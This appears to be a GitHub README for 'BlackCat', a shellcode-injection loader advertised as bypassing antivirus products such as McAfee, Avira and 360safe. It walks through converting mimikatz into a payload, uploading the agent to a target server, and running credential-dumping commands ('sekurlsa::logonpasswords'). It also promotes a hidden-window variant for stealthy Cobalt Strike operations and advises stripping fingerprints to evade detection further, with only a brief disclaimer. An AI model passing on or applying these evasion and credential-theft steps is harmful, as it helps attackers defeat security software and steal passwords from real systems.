lost effectiveness<br>
lost effectiveness<br>

<br><br>
![logo](https://github.com/YongYe-Security/BlackCat/assets/90460865/9af9e436-d26a-4efc-8200-d40f0d895a1b)
<br>
<br>
**Do not use this tool for any unauthorized or illegal network attacks. I take no responsibility for any misuse or illegal activities conducted with this tool.**
<br>
<br>
A tool created for recreational purposes. It has been tested and proven to bypass antivirus software such as McAfee, Avira, 360safe, and others. In addition to static evasion techniques, it also supports dynamic evasion. The core functionality of the tool relies on shellcode injection technology.
It is recommended to refactor the open-source tool to remove certain fingerprints and increase the probability of bypassing antivirus (AV) software. Of course, this tool will be further modified to evade AV detection once again.
The code might not be aesthetically pleasing, and there are currently no plans for open-sourcing or updating it. However, I assure you that there are no backdoors in the code.  
<br>
<br>
**Help**

```
options:
  -h, --help            show this help message and exit
  -f FILE, --file FILE  filename,Files to be loaded.
```

<br>
<br>

**Steps for usage**

1.Generate payload using Admin side,Take mimikatz as an example below.

Note:exeNmae is the software name of the executable file to be used, no suffix is required. Only effective for exe format files.

After execution, two files will be generated: one is the shellcode file (mimikatz.txt) and the other is the attack payload (mimikatz_Payload.txt).

```
BlackCat-Admin_v1.2.exe -f exeName
Example:BlackCat-Admin_v1.2.exe -f mimikatz
```

![Snipaste_23_14-12-38-4-27-174](https://github.com/YongYe-Security/BlackCat/assets/90460865/f59fc9e4-1086-4333-8267-07376af7c26c)


2.Rename Payload

```
ren exeName_Payload.txt Payload.txt
Example:ren mimikatz_Payload.txt Payload.txt
```

3.Upload the loader to the target server to load the tool and execute the command.

You need to upload three files, BlackCat-Agent.exe, exeName.txt, and payload.txt, to the target server.

Remote loading is currently not available. Only local loading solutions are provided.

```
BlackCat-Agent_v1.2.exe exeName.txt  cmd
Example:BlackCat-Agent_v1.2.exe mimikatz.txt "privilege::debug" "sekurlsa::logonpasswords" exit
```

![23-13-45-31-51](https://github.com/YongYe-Security/BlackCat/assets/90460865/ecd81dce-226e-4214-bacc-53650b6ef500)


The difference between BlackCat-AgentCs_v1.2.exe and BlackCat-Agent_v1.2.exe lies in their user interface. BlackCat-AgentCs does not display a terminal or graphical interface, making it suitable for scenarios like Cobalt Strike where stealthiness is required. On the other hand, BlackCat-Agent allows you to view the feedback of command execution in the terminal interface.

<br>
<br>

**Known bug, but currently unable to fix.**

After running the program, all command-line parameters will be passed to the executed tool. The usage of Mimikatz is not affected, and it is also possible to run the Cobalt Strike client.

The initial design intention of the tool was to modularly bypass antivirus (AV) software, but due to these limitations, its usage is restricted. In the future, there are plans to refactor the code and switch to DLL loading and injection methods. However, it still remains a useful tool for Cobalt Strike scenarios.

![Snipaste_23_15-12-21-4-38-571](https://github.com/YongYe-Security/BlackCat/assets/90460865/b87873cb-d799-4be9-80f6-100e8a5ee99e)




To obtain the password for extracting the compressed file, please join our official account's group chat.  YongYe_Security

